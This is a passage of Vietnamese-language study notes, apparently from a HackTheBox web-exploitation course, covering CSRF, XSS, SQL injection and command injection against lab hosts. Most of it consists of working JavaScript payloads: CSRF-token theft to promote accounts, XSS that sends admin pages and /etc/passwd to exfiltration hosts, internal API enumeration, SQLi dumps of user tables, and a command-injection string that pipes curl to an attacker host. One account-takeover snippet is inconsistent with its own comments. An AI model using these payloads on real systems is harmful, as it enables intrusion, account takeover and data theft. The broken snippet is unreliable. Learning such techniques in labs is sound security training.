var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);
```

- **Giải thích**:
  - `xhr.open()`: Mở một yêu cầu GET đến `/profile.php`.
  - `xhr.withCredentials = true`: Gửi yêu cầu kèm theo cookie phiên của nạn nhân.
  - `xhr.responseText`: Chứa HTML trả về, trong đó có chứa token CSRF.
  - `csrftoken`: Lấy token từ phần tử HTML có ID là `csrf`.

**Payload để gửi yêu cầu CSRF**:

```javascript
var csrf_req = new XMLHttpRequest();
var params = `promote=htb-stdnt&csrf=${csrftoken}`;
csrf_req.open('POST', 'https://vulnerablesite.htb/profile.php', false);
csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
csrf_req.withCredentials = true;
csrf_req.send(params);
```

- **Giải thích**:
  - `csrf_req.open()`: Mở một yêu cầu POST đến `/profile.php`.
  - `setRequestHeader()`: Thiết lập header Content-Type để gửi dữ liệu dưới dạng `application/x-www-form-urlencoded`.
  - `withCredentials = true`: Gửi kèm cookie phiên.
  - `csrf_req.send(params)`: Gửi yêu cầu kèm theo token CSRF hợp lệ.

#### **5. Payload Hoàn chỉnh trên Máy chủ Khai thác**

```html
<script>
  // Lấy CSRF token
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://vulnerablesite.htb/profile.php', false);
  xhr.withCredentials = true;
  xhr.send();
  var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
  var csrftoken = encodeURIComponent(doc.getElementById('csrf').value);

  // Thực hiện tấn công CSRF
  var csrf_req = new XMLHttpRequest();
  var params = `promote=htb-stdnt&csrf=${csrftoken}`;
  csrf_req.open('POST', 'https://vulnerablesite.htb/profile.php', false);
  csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
  csrf_req.withCredentials = true;
  csrf_req.send(params);
</script>
```

- Payload này sẽ:
  1. Gửi yêu cầu GET đến `/profile.php` để lấy CSRF token hợp lệ.
  2. Gửi yêu cầu POST đến `/profile.php` để thực hiện thay đổi trạng thái (thăng cấp tài khoản) kèm theo token CSRF hợp lệ.

#### **6. Kiểm tra Khai thác**

- Khi chúng ta xem payload trên máy chủ khai thác (`http://exploitserver.htb/exploit`), yêu cầu GET được thực hiện để lấy CSRF token, sau đó là yêu cầu POST với token hợp lệ.
- Sau khi gửi payload cho nạn nhân và chờ vài giây, chúng ta có thể kiểm tra và thấy rằng tài khoản của mình đã được thăng cấp lên quyền admin.

---
# Miscellaneous CSRF Exploitation

Trong bài viết này, chúng ta sẽ khám phá các kỹ thuật khai thác CSRF (Cross-Site Request Forgery) khác nhau, với mục đích vượt qua các biện pháp bảo vệ CSRF yếu. Các kỹ thuật này bao gồm việc kết hợp nhiều vector tấn công và khai thác các lỗ hổng trong cách các cookie SameSite được cấu hình, sử dụng tấn công Brute-Force đối với các mã thông báo CSRF yếu, và vượt qua các biện pháp bảo vệ CSRF dựa trên tiêu đề HTTP.

#### 1. **Kết hợp các vector tấn công để vượt qua SameSite Cookies**

**SameSite cookie** là một cơ chế bảo vệ được triển khai bởi trình duyệt web, giúp ngăn chặn các yêu cầu từ các trang web khác (cross-site requests). Tuy nhiên, nó có thể bị bỏ qua nếu ứng dụng web sử dụng các yêu cầu GET để thay đổi trạng thái, vì cookie SameSite chỉ gửi khi yêu cầu được đánh dấu là "safe" (an toàn), như GET.

Ví dụ, một trang web sử dụng cookie SameSite với thuộc tính `Strict`, có nghĩa là trình duyệt sẽ không gửi cookie trong các yêu cầu cross-site, ngay cả khi yêu cầu này có thể thay đổi trạng thái trên máy chủ. Tuy nhiên, nếu ứng dụng sử dụng một **client-side redirect** (chuyển hướng từ phía khách hàng) thay vì server-side redirect (chuyển hướng từ phía máy chủ), trình duyệt vẫn gửi cookie vì đây được coi là một yêu cầu "SameSite". 

**Cách khai thác**:
Giả sử chúng ta có một ứng dụng với một endpoint `/profile.php` có thể thay đổi trạng thái người dùng (ví dụ: thăng cấp người dùng lên quyền admin) thông qua GET request. Mặc dù cookie SameSite được thiết lập `Strict`, chúng ta có thể tạo một payload sử dụng redirect client-side để gửi yêu cầu tới endpoint này. Khi nạn nhân truy cập vào trang bị khai thác, trình duyệt sẽ tự động thực hiện chuyển hướng và gửi cookie cùng yêu cầu, qua đó thực hiện tấn công CSRF thành công.

**Ví dụ về payload**:
```html
<script>
 document.location = "http://vulnerablesite.htb/admin.php?user=htb-stdnt&promote=htb-stdnt";
</script>
```

#### 2. **Khai thác lỗ hổng XSS trong các subdomains để vượt qua SameSite**

Các subdomain được coi là cùng một "site" trong bối cảnh cookie SameSite. Điều này có thể bị khai thác trong trường hợp một ứng dụng web có lỗ hổng XSS (Cross-Site Scripting) trên subdomain. Nếu một subdomain bị XSS và người quản trị vẫn đăng nhập vào trang chính, chúng ta có thể lợi dụng lỗ hổng này để thực hiện CSRF tấn công bằng cách gửi một POST request chứa thông tin thay đổi trạng thái.

**Ví dụ**: Chúng ta sử dụng payload XSS để gửi một POST request từ subdomain bị lỗ hổng, nhằm thực hiện thăng cấp người dùng lên quyền admin.

**Payload XSS**:
```html
<script>
 var csrf_req = new XMLHttpRequest();
 var params = 'promote=htb-stdnt';
 csrf_req.open('POST', 'http://vulnerablesite.htb/profile.php', false);
 csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
 csrf_req.withCredentials = true;
 csrf_req.send(params);
</script>
```

#### 3. **Brute-Force Mã thông báo CSRF yếu**

Một trong những cách khai thác CSRF khác là tìm kiếm và tấn công vào các **mã thông báo CSRF yếu**, ví dụ như mã thông báo không ngẫu nhiên hoặc có thể dự đoán được. Đôi khi, mã thông báo CSRF có thể được tạo ra dựa trên thông tin dễ đoán như timestamp (dấu thời gian), điều này tạo cơ hội cho tấn công Brute-force.

**Cách khai thác**:
Nếu chúng ta nhận thấy rằng mã thông báo CSRF chỉ đơn giản là một Unix Timestamp, ta có thể đoán được giá trị của nó và gửi một yêu cầu có chứa mã thông báo đúng. Tuy nhiên, vì SameSite Lax policy có thể ngăn chặn các tấn công Brute-force qua trình duyệt, chúng ta phải "hardcode" (cứng mã) giá trị của mã thông báo trong form HTML.

**Ví dụ về payload**:
```html
<html>
 <body>
 <form method="GET" action="http://vulnerablesite.htb/profile.php">
  <input type="hidden" name="promote" value="htb-stdnt" />
  <input type="hidden" name="csrf" value="1692981700" />
  <input type="submit" value="Submit request" />
 </form>
 <script>
  document.forms[0].submit();
 </script>
 </body>
</html>
```

#### 4. **Vượt qua các biện pháp bảo vệ CSRF dựa trên tiêu đề HTTP**

Một số ứng dụng web sử dụng **biện pháp bảo vệ CSRF** thông qua các tiêu đề HTTP, ví dụ như kiểm tra giá trị trong **Referer header** hoặc **Origin header**. Tuy nhiên, nếu biện pháp này được thực hiện sai cách, kẻ tấn công có thể dễ dàng bỏ qua.

**Cách khai thác**:
Giả sử một ứng dụng kiểm tra sự hiện diện của tên miền trong `Referer header`. Nếu chỉ kiểm tra một phần của URL (chẳng hạn như kiểm tra sự có mặt của `vulnerablesite.htb` trong header), kẻ tấn công có thể giả mạo `Referer header` và gửi yêu cầu từ một server khai thác, ví dụ: `http://exploitserver.htb/somepath/vulnerablesite.htb`.

#### 5. **CSRF với JSON Request Body**

Các ứng dụng hiện đại thường yêu cầu dữ liệu gửi đi dưới định dạng JSON. Mặc dù việc gửi payload CSRF qua JSON có thể gặp khó khăn do hạn chế về **Content-Type** (vì CSRF payload thông thường chỉ hỗ trợ các loại như `application/x-www-form-urlencoded`), nhưng trong một số trường hợp, các lỗi cấu hình CORS hoặc kiểm tra tiêu đề Content-Type sai cách có thể cho phép kẻ tấn công gửi yêu cầu chứa JSON.

**Cách khai thác**:
Chúng ta có thể tạo một CSRF payload gửi dữ liệu dưới dạng JSON mặc dù sử dụng Content-Type không chính xác, nhờ vào việc ứng dụng không kiểm tra chính xác tiêu đề `Content-Type`.

**Ví dụ về payload**:
```html
<html>
 <body>
  <form method="POST" action="http://csrf.vulnerablesite.htb/profile.php" enctype="text/plain">
   <input type="hidden" name='{"promote": "htb-stdnt", "dummykey": "dummyvalue"}' />
  </form>
  <script>
   document.forms[0].submit();
  </script>
 </body>
</html>
```

---
#Giới thiệu về Khai thác XSS (Cross-Site Scripting)

Khai thác lỗ hổng Cross-Site Scripting (XSS) cho phép kẻ tấn công tiêm mã JavaScript vào trang web, từ đó có thể thực hiện các yêu cầu HTTP, nhận phản hồi và đánh cắp dữ liệu gửi tới một máy chủ do chúng kiểm soát. Thông qua XSS, kẻ tấn công có thể gửi các yêu cầu giữa các nguồn khác nhau (cross-origin requests) và kết hợp với kỹ thuật CSRF (Cross-Site Request Forgery) để khai thác toàn bộ mạng nội bộ của nạn nhân.

Một trong những lý do XSS và CSRF trở thành mối đe dọa mạnh mẽ là do trình duyệt web thường áp dụng chính sách `SameSite` cho cookie. Chính sách này giới hạn khả năng khai thác CSRF bằng cách ngăn cản các yêu cầu từ các nguồn khác mà không có sự cho phép rõ ràng từ máy chủ. Tuy nhiên, việc kết hợp XSS và CSRF lại tạo ra một kỹ thuật khai thác rất nguy hiểm.

### Cờ Cookie `HTTPOnly`

Mặc dù việc đánh cắp cookie session của nạn nhân là một kỹ thuật phổ biến trong các cuộc tấn công XSS, nhưng việc này có thể bị ngăn chặn nếu sử dụng cờ `HttpOnly` trên cookie session. Cờ này ngăn JavaScript truy cập vào cookie, nghĩa là nếu kẻ tấn công cố gắng truy cập vào `document.cookie`, cookie có cờ `HttpOnly` sẽ không hiển thị.

Tuy nhiên, việc ngăn chặn quyền truy cập vào cookie không làm giảm mức độ nguy hiểm của XSS. Điều này bởi vì một khi XSS được khai thác, kẻ tấn công có thể thực thi mã JavaScript tùy ý trong trình duyệt của nạn nhân và thực hiện các hành động thay mặt cho nạn nhân mà không cần phải biết giá trị của cookie session.

### Lấy Dữ Liệu với XSS

Khi mã XSS được thực thi trong trình duyệt của nạn nhân, nó có thể truy cập bất kỳ dữ liệu nào từ góc độ của nạn nhân. Nếu nạn nhân có quyền quản trị trên ứng dụng web, kẻ tấn công có thể khai thác lỗ hổng XSS để lấy quyền truy cập quản trị và đánh cắp dữ liệu từ ứng dụng web.

Để lấy dữ liệu từ ứng dụng web và gửi chúng đến máy chủ tấn công, kẻ tấn công có thể sử dụng đối tượng `XMLHttpRequest` để thực hiện các yêu cầu HTTP và tương tác với phản hồi từ máy chủ.

### Ví Dụ Cụ Thể: Tấn Công XSS trong Ứng Dụng Web

Giả sử chúng ta có một ứng dụng web đơn giản, như ứng dụng "guestbook", nơi người dùng có thể đăng bình luận. Nếu ứng dụng này có lỗ hổng XSS, kẻ tấn công có thể tiêm mã JavaScript vào một bình luận.

#### Mã XSS Tiêm Vào:

```javascript
<script>
    // Tạo yêu cầu GET đến /admin.php để lấy thông tin trang quản trị
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/admin.php', false);  // Gửi yêu cầu GET đến trang quản trị
    xhr.withCredentials = true;  // Đảm bảo cookie sẽ được gửi kèm theo yêu cầu
    xhr.send();

    // Mã hóa dữ liệu phản hồi thành base64 và gửi đến máy chủ tấn công
    var exfil = new XMLHttpRequest();
    exfil.open("GET", "http://attacker-server.com/exfil?r=" + btoa(xhr.responseText), false);
    exfil.send();
</script>
```

#### Giải Thích:

1. **Yêu cầu GET tới `/admin.php`**: Mã JavaScript gửi một yêu cầu GET tới trang quản trị (`/admin.php`) nơi có thể chứa thông tin nhạy cảm.
2. **Sử dụng `withCredentials = true`**: Điều này đảm bảo rằng các cookie (như cookie session) sẽ được gửi cùng với yêu cầu, giúp kẻ tấn công duy trì quyền truy cập vào phiên làm việc của nạn nhân.
3. **Mã hóa và gửi dữ liệu tới máy chủ tấn công**: Sau khi nhận được phản hồi từ `/admin.php`, mã JavaScript mã hóa dữ liệu này dưới dạng base64 và gửi đến máy chủ tấn công (ví dụ `http://attacker-server.com/exfil`).

---
# Khai thác Tấn công từ Sessions (Phiên làm việc) của Nạn nhân

Sau khi đã thảo luận về cách lấy dữ liệu từ ngữ cảnh người dùng của nạn nhân thông qua lỗ hổng XSS, chúng ta sẽ tiếp tục khám phá cách kích hoạt các hành động thay đổi trạng thái (state-changing actions) trong ứng dụng web. Vì XSS cho phép kiểm soát hoàn toàn phiên làm việc của nạn nhân, kẻ tấn công có thể kích hoạt bất kỳ tính năng nào trong ngữ cảnh của nạn nhân. Điều này có thể dẫn đến việc chiếm đoạt toàn bộ tài khoản của nạn nhân hoặc mở ra các vector tấn công khác.

Chúng ta sẽ tiếp tục sử dụng ứng dụng web mẫu đã được giới thiệu trong các phần trước để làm ví dụ.

### Chiếm Đoạt Tài Khoản

Ứng dụng web mẫu của chúng ta có một chức năng cập nhật hồ sơ người dùng, bao gồm thay đổi mật khẩu. Việc thay đổi mật khẩu tài khoản không yêu cầu mật khẩu cũ, và điều này khiến chúng ta có thể tận dụng lỗ hổng XSS để thay đổi mật khẩu của nạn nhân.

Dưới đây là yêu cầu HTTP để cập nhật tài khoản:

```
POST /update-profile HTTP/1.1
Content-Type: application/x-www-form-urlencoded
```

Vì vậy, khi thay đổi mật khẩu của tài khoản, kẻ tấn công chỉ cần gửi một yêu cầu POST đến endpoint `/update-profile` mà không cần mật khẩu cũ. Đây chính là điểm yếu mà kẻ tấn công có thể lợi dụng, đặc biệt khi ứng dụng web sử dụng token CSRF (Cross-Site Request Forgery) để bảo vệ.

Tuy nhiên, với XSS, kẻ tấn công có thể đọc được token CSRF và thêm vào yêu cầu của mình, qua đó bỏ qua bảo vệ này.

#### Quy Trình:

1. **Tiêm mã XSS** vào ứng dụng web để kích hoạt mã JavaScript từ máy chủ tấn công.
2. **Gửi yêu cầu GET tới `/home.php`** để lấy token CSRF hợp lệ.
3. **Trích xuất token** và sử dụng token này trong yêu cầu POST tiếp theo để thay đổi mật khẩu của nạn nhân.

Mã JavaScript tiêm vào có thể trông như sau:

```javascript
<script>
    // Gửi yêu cầu GET đến /home.php để lấy token CSRF
    var csrf_req = new XMLHttpRequest();
    csrf_req.open('POST', '/home.php', false);
    csrf_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    csrf_req.withCredentials = true;
    csrf_req.send(params); // params chứa thông tin yêu cầu như username, token CSRF

    // Sau khi lấy token, gửi yêu cầu POST thay đổi mật khẩu
    var change_pass_req = new XMLHttpRequest();
    change_pass_req.open('POST', '/update-profile', false);
    change_pass_req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    change_pass_req.withCredentials = true;
    change_pass_req.send('password=new_password'); // Cập nhật mật khẩu
</script>
```

Khi nạn nhân kích hoạt mã XSS này, kẻ tấn công sẽ có thể đăng nhập vào tài khoản của nạn nhân bằng mật khẩu mới (`admin:pwned`), qua đó chiếm quyền điều khiển tài khoản.

### Chuỗi Các Lỗ Hổng (Chaining Vulnerabilities)

Như đã thấy, XSS cho phép kẻ tấn công kích hoạt bất kỳ tính năng nào trong ứng dụng từ ngữ cảnh của nạn nhân. Tuy nhiên, chúng ta có thể đi xa hơn và kết hợp nhiều lỗ hổng khác nhau trong ứng dụng web, ví dụ như kết hợp XSS với một lỗ hổng Local File Inclusion (LFI) để truy cập vào các tệp hệ thống mà nạn nhân không thể truy cập trực tiếp.

#### Phân tích từ góc độ của nạn nhân:

1. **Tiêm mã XSS** và **lấy thông tin từ `/home.php`** cho thấy rằng nạn nhân có thể truy cập trang `/admin.php`, nhưng tài khoản của kẻ tấn công không có quyền truy cập vào đó.
2. **Khai thác LFI**: Bằng cách thêm tham số `view` vào URL của `/admin.php`, kẻ tấn công có thể thử tải tệp từ hệ thống (như `/etc/passwd`).

#### Ví dụ mã XSS để khai thác LFI:

```javascript
<script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/admin.php?view=../../../../etc/passwd', false);
    xhr.withCredentials = true;
    xhr.send();

    var exfil = new XMLHttpRequest();
    exfil.open("GET", "http://exfiltrate.htb/lfi?r=" + btoa(xhr.responseText), false);
    exfil.send();
</script>
```

Sau khi nạn nhân kích hoạt mã XSS, kẻ tấn công sẽ nhận được tệp `/etc/passwd` từ máy chủ, tiết lộ thông tin quan trọng về hệ thống.

---
# Liệt kê các API nội bộ thông qua lỗ hổng XSS

Trong bài viết này, chúng ta sẽ tiếp tục sử dụng lỗ hổng XSS để thực hiện các cuộc tấn công mạnh mẽ từ phía trình duyệt của nạn nhân. Lần này, mục tiêu của chúng ta là thâm nhập và liệt kê các API nội bộ mà chỉ có thể truy cập từ mạng riêng của nạn nhân. Điều này có thể giúp chúng ta thu thập thêm thông tin nhạy cảm hoặc thậm chí tấn công vào các ứng dụng không công khai.

### Bước 1: Phát hiện API nội bộ

Chúng ta bắt đầu như đã làm trong các ví dụ trước đó, sử dụng mã XSS cơ bản để chèn vào mục guestbook hoặc bất kỳ điểm nào có thể tiêm mã JavaScript:

```html
<script src="http://exploitserver.htb/exploit"></script>
```

Sau khi mã XSS được kích hoạt, chúng ta sẽ tiếp tục xâm nhập và trích xuất thông tin từ trang quản trị. Dưới đây là mã JavaScript để gửi yêu cầu GET đến trang quản trị `/admin.php` và thu thập dữ liệu từ đó:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin.php', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Dữ liệu thu được từ trang quản trị tiết lộ một API nội bộ có đường dẫn `http://api.vulnerablesite.htb/`. Tuy nhiên, khi chúng ta cố gắng truy cập API này, sẽ có một lỗi xảy ra vì API chỉ có thể truy cập từ mạng nội bộ của nạn nhân. Điều này yêu cầu chúng ta phải điều chỉnh payload của mình để tiếp tục khảo sát API từ phía trình duyệt của nạn nhân.

### Bước 2: Liệt kê API nội bộ

Để tiếp tục, chúng ta cần điều chỉnh payload để truy xuất dữ liệu từ các API mà nạn nhân có thể truy cập được. Ví dụ, giả sử chúng ta muốn trích xuất endpoint `/v1/sessions` từ API nội bộ. Chúng ta sẽ tạo một payload như sau:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.vulnerablesite.htb/v1/sessions', false);
xhr.withCredentials = true;
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Tuy nhiên, nếu chúng ta không nhận được dữ liệu trên máy chủ exfiltration, có thể xảy ra sự cố với việc thiết lập CORS. Để tránh các lỗi này, chúng ta cần đảm bảo payload của mình khớp với cách mà ứng dụng gốc đang thực hiện yêu cầu, đặc biệt là đối với các header `credentials`.

### Bước 3: Đối phó với chính sách Same-Origin và CORS

Trong trường hợp xảy ra lỗi CORS (Cross-Origin Resource Sharing), có thể vì ứng dụng không gửi yêu cầu với `credentials: 'include'` như chúng ta đang làm trong payload. Để khắc phục điều này, chúng ta cần điều chỉnh payload để không gửi cookie hoặc thông tin xác thực, giống như cách mà ứng dụng gốc thực hiện:

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://api.vulnerablesite.htb/v1/sessions', false);
xhr.send();

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Nếu API yêu cầu xác thực với token Bearer, chúng ta có thể sử dụng `localStorage` của nạn nhân để truy xuất token và thêm vào header `Authorization` trong yêu cầu của chúng ta.

### Bước 4: Kiểm tra và xử lý lỗi CORS

Để xác định cấu hình CORS chính xác và tránh lỗi, chúng ta có thể sử dụng khối `try-catch` trong JavaScript để bắt lỗi và phân tích nguyên nhân:

```javascript
try {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'http://api.vulnerablesite.htb/v1/sessions', false);
  xhr.withCredentials = true;
  xhr.send();
  var msg = xhr.responseText;
} catch (error) {
  var msg = error;
}

var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(msg), false);
exfil.send();
```

### Bước 5: Duyệt các API khác

Một khi chúng ta đã thành công trong việc lấy dữ liệu từ một endpoint, bước tiếp theo là duyệt qua các endpoint khác. Một phương pháp đơn giản là tạo một trình quét brute-force để thử các tên endpoint phổ biến, sử dụng một danh sách như trong file `objects-lowercase.txt` từ SecLists.

Dưới đây là mã JavaScript để kiểm tra nhiều endpoint:

```javascript
var endpoints = ['access', 'account', 'accounts', 'balance', 'profile', 'user', 'settings', 'password', 'token', 'login'];
for (i in endpoints) {
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', `http://api.vulnerablesite.htb/v1/${endpoints[i]}`, false);
    xhr.send();
    if (xhr.status != 404) {
      var exfil = new XMLHttpRequest();
      exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(endpoints[i]), false);
      exfil.send();
    }
  } catch {
    // Do nothing
  }
}
```

Kết quả sẽ giúp chúng ta phát hiện các endpoint hợp lệ mà API cung cấp, từ đó có thể tiếp tục khai thác thêm thông tin nhạy cảm từ API nội bộ.

---
# Khai thác ứng dụng Web nội bộ
Trong phần này, chúng ta sẽ tiếp tục sử dụng lỗ hổng XSS để khai thác một lỗ hổng bảo mật khác trong một ứng dụng web nội bộ. Đây là một ví dụ về việc sử dụng XSS để khai thác SQL injection và Command injection trong một ứng dụng web mà người tấn công không thể truy cập trực tiếp do chúng nằm trong mạng nội bộ.

### 1. Khám Phá Lỗ Hổng

Lần đầu tiên, chúng ta sẽ dùng payload XSS giống như trong các phần trước để lấy dữ liệu từ endpoint `/admin.php`. Tuy nhiên, thay vì chỉ lấy thông tin từ một ứng dụng web bên ngoài, lần này chúng ta sẽ xâm nhập vào một ứng dụng web nội bộ ở địa chỉ `http://internal.vulnerablesite.htb`.

- **Kiểm tra việc truy cập trực tiếp**: Nếu cố gắng truy cập trực tiếp trang này, chúng ta bị chặn lại (được bảo vệ bởi một cơ chế xác thực).
  
- **Dùng XSS để kiểm tra ứng dụng nội bộ**: Ta có thể sử dụng lỗ hổng XSS để gửi các yêu cầu HTTP từ trình duyệt của nạn nhân, qua đó có thể truy xuất các nội dung của trang web nội bộ mà không cần phải truy cập trực tiếp.

Ví dụ về cách gửi một yêu cầu GET để trích xuất nội dung của trang index của ứng dụng nội bộ:
```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://internal.vulnerablesite.htb/', false);
xhr.send();
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

### 2. Khai Thác SQL Injection

Khi kiểm tra trang đăng nhập của ứng dụng nội bộ, chúng ta nhận thấy rằng có thể khai thác SQL Injection từ trường nhập liệu tên người dùng.

- **Gửi Payload để kiểm tra SQL Injection**:
```javascript
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("'test")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

- **Phản hồi với lỗi SQL**: Nếu trang trả về lỗi như `HTTP 500 - SQL Error`, điều này xác nhận ứng dụng web dễ bị tấn công SQL Injection.

### 3. Khai Thác SQL Injection Để Bỏ Qua Xác Thực

Để bỏ qua cơ chế xác thực, chúng ta có thể dùng payload SQL Injection như sau:
```javascript
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' OR '1'='1' -- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

Kết quả trả về cho thấy chúng ta đã bypass được trang đăng nhập và có quyền truy cập vào thông tin người dùng.

### 4. Dump Cơ Sở Dữ Liệu

Tiếp theo, chúng ta có thể khai thác thêm SQL Injection để dump cơ sở dữ liệu.

- **Dump tên bảng**:
```javascript
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(tbl_name) FROM sqlite_master-- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

- **Dump schema của bảng users**:
```javascript
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT 1,2,3,group_concat(sql) FROM sqlite_master WHERE name='users'-- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

- **Dump dữ liệu bảng users**:
```javascript
var xhr = new XMLHttpRequest();
var params = `uname=${encodeURIComponent("' UNION SELECT id,username,password,info FROM users-- -")}&pass=x`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

### 5. Khai Thác Command Injection Qua XSS

Tiếp theo, chúng ta sẽ chuyển sang khai thác một lỗ hổng Command Injection thông qua XSS. Bằng cách gửi các yêu cầu POST, chúng ta có thể gửi các lệnh shell tới server nội bộ và nhận kết quả phản hồi qua exfiltration server.

- **Kiểm tra việc thực thi lệnh `curl`**: Đầu tiên, chúng ta thử gửi một yêu cầu với tên miền không tồn tại và nhận được phản hồi lỗi từ lệnh `curl`:
```javascript
var xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("http://doesnotexist.htb")}`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);
var exfil = new XMLHttpRequest();
exfil.open("GET", "http://exfiltrate.htb/exfil?r=" + btoa(xhr.responseText), false);
exfil.send();
```

- **Khai thác Command Injection**: Nếu lỗ hổng không được xử lý đúng, chúng ta có thể thêm một lệnh `curl` khác để gửi kết quả ra ngoài:
```javascript
var xhr = new XMLHttpRequest();
var params = `webapp_selector=${encodeURIComponent("| curl http://exfiltrate.htb?pwn")}`;
xhr.open('POST', 'http://internal.vulnerablesite.htb/check', false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);
```

Sau khi gửi yêu cầu, chúng ta nhận được kết quả từ lệnh thực thi trên server qua exfiltration server.

---
# Chính sách bảo mật nội dung (CSP)

**Giới thiệu về CSP**

Content Security Policy (CSP) là một cơ chế bảo mật được cấu hình trong tiêu đề phản hồi `Content-Security-Policy`. CSP cho phép quản trị viên web kiểm soát các nguồn tài nguyên mà trang web có thể tải và thực thi, nhằm giảm thiểu các cuộc tấn công như Cross-Site Scripting (XSS) và dữ liệu từ các nguồn không an toàn.

**Cấu trúc của CSP**

Một CSP bao gồm nhiều chỉ thị (directives), mỗi chỉ thị cho phép một hoặc nhiều giá trị. Trình duyệt sẽ thực thi CSP và ngừng tải hoặc thực thi tài nguyên nếu không phù hợp với các giá trị chỉ thị trong CSP.

Ví dụ về một số chỉ thị phổ biến trong CSP:

- **script-src**: Quy định các nguồn được phép tải và thực thi JavaScript.
- **connect-src**: Các nguồn được phép thực hiện các yêu cầu HTTP từ các script, ví dụ như `XMLHttpRequest`.
- **default-src**: Giá trị mặc định nếu không có chỉ thị cụ thể. Ví dụ, nếu không có chỉ thị `img-src`, trình duyệt sẽ sử dụng giá trị của `default-src` cho hình ảnh.
- **frame-ancestors**: Xác định các nguồn được phép nhúng trang vào trong iframe, giúp ngăn chặn các cuộc tấn công Clickjacking.
- **form-action**: Xác định các nguồn được phép gửi dữ liệu từ form.

Các giá trị bổ sung cho các chỉ thị:

- **'none'**: Không cho phép bất kỳ nguồn nào.
- **'self'**: Chỉ cho phép các nguồn từ cùng một miền (origin).
- ***.benignsite.htb**: Cho phép tất cả các miền con của `benignsite.htb`.
- **unsafe-inline**: Cho phép các phần tử inline (ví dụ: inline JavaScript hoặc CSS).
- **unsafe-eval**: Cho phép đánh giá mã động như hàm `eval` của JavaScript.
- **sha256-407e1bf4a1472948aa7b15cafa752fcf8e90710833da8a59dd8ef8e7fe56f22d**: Cho phép một phần tử thông qua giá trị băm (hash).
- **nonce-S0meR4nd0mN0nC3**: Cho phép một phần tử thông qua nonce (mã ngẫu nhiên).

**CSP An Toàn**

Để đảm bảo bảo mật tối đa, CSP cần được cấu hình càng nghiêm ngặt càng tốt. Một cách tốt để thực hiện là bắt đầu với một CSP cơ bản và dần dần nới lỏng các hạn chế cho đến khi ứng dụng web hoạt động như mong muốn. Một CSP cơ bản có thể như sau:

```plaintext
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';
```

**Giải thích CSP trên:**
- **default-src 'none'**: Không cho phép bất kỳ tài nguyên nào từ bên ngoài.
- **script-src 'self'**: Chỉ cho phép tải và thực thi JavaScript từ cùng một miền.
- **connect-src 'self'**: Các yêu cầu HTTP từ JavaScript chỉ được phép gửi đến cùng một miền.
- **img-src 'self'**: Chỉ cho phép tải hình ảnh từ cùng một miền.
- **style-src 'self'**: Chỉ cho phép tải CSS từ cùng một miền.
